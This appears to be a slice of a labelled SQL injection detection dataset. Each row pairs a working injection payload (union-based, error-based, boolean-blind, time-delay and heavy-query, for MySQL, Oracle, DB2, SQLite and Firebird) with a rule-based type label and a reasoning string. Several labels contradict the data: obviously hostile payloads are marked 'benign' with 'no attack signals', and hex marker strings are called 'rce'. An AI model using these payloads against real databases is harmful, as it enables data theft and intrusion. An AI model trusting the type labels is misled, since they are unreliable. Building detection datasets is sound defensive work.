row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10121,"1' ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'dgwe' like 'dgwe",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10122,"1"" ) ) as swwb where 4244 = 4244",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10123,"1"" ) ) as fapw where 4722 = 4722 union all select null,null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10124,"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and 'bwrb' like 'bwrb",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
10125,"-2718"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""kbvd"" like ""kbvd",1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
10126,"-1526"" ) where 4870 = 4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10127,"1' ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
10128,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'afdy' like 'afdy",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
10129,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'kufi' = 'kufi",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
10130,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'gpeo' like 'gpeo",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
10131,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10132,"1"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""otgh"" like ""otgh",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10133,"1"" where 2394 = 2394 and 8831 = 8333--",1,,boolean_blind,generic,0.95,2394 = 2394 and detected — boolean_blind injection (priority 8) on generic,rule-based
10134,"-3090"" or make_set ( 9354 = 9354,7185 ) and ""qowe"" like ""qowe",1,,boolean_blind,generic,0.95,"like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10135,"1"" ) ) as vgsb where 4747 = 4747",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10136,"1' in boolean mode ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10137,"1'|| ( select 'oxam' from dual where 7162 = 7162 and make_set ( 8403 = 8403,8899 ) ) ||'",1,,boolean_blind,oracle,0.95,7162 = 7162 and detected — boolean_blind injection (priority 8) on oracle,rule-based
10138,-5067' ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'vkab' like 'vkab,1,,boolean_blind,firebird,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on firebird",rule-based
10139,"1' in boolean mode ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
